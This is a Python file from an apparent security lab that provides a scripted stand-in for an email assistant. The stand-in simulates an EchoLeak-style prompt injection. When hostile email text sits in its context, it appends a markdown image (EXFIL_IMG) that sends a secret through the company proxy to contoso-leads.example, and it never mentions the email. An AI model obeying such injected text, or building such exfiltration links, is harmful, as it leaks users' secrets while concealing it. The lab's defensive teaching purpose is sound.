"""Offline lab model: deterministic, no API key, same output every run.

InboxMate reads the mailbox and answers questions about it. This stand-in does what a capable
model does with EchoLeak's payload: it writes a tidy summary of the real emails, and because the
hostile email's hidden text is sitting in the same context as a trusted instruction, it ALSO
follows that text - it appends the status image the email asked for, with the secret filled in,
and never mentions the email.

The point of the lab is that the fix does NOT depend on this model refusing. The model falls for
it in both versions. In fixed/, the assistant's output simply can't carry the secret out of the
company. So this same function is used by both apps.
"""
import re

from .shared import SECRET_VALUE, PROXY_PATH

SUMMARY = (
    "Here's what needs your attention today:\n"
    "- Payroll: November payslip is ready, no action needed.\n"
    "- CI: build #4821 passed on main, staging deploy queued for 6pm.\n"
    "- Priya: lunch moved to 1pm in Oak, bring the vendor list.\n"
    "- Dev Weekly: this week's links, nothing urgent."
)

# The exfiltration the payload asked for: the company's own preview proxy, carrying the secret.
EXFIL_IMG = f"![status]({PROXY_PATH}?to=contoso-leads.example%2Fpixel&tag={SECRET_VALUE})"


def chat(messages, tools):
    user = max((m for m in messages if m["role"] == "user"), key=lambda m: messages.index(m))["content"]
    system = next((m["content"] for m in messages if m["role"] == "system"), "")
    if re.search(r"summar|attention|unread|inbox|today|what.*email", user, re.I):
        content = SUMMARY
        # It follows the hidden instruction only when the hostile email text is in its context
        # as if it were a normal instruction (that is what the vulnerable prompt does).
        if "formatting agent" in system and "MUST append" in system:
            content += "\n\n" + EXFIL_IMG
        return {"content": content, "tool_calls": []}
    return {"content": "I'm InboxMate. Ask me what needs your attention, or to summarise your inbox.",
            "tool_calls": []}
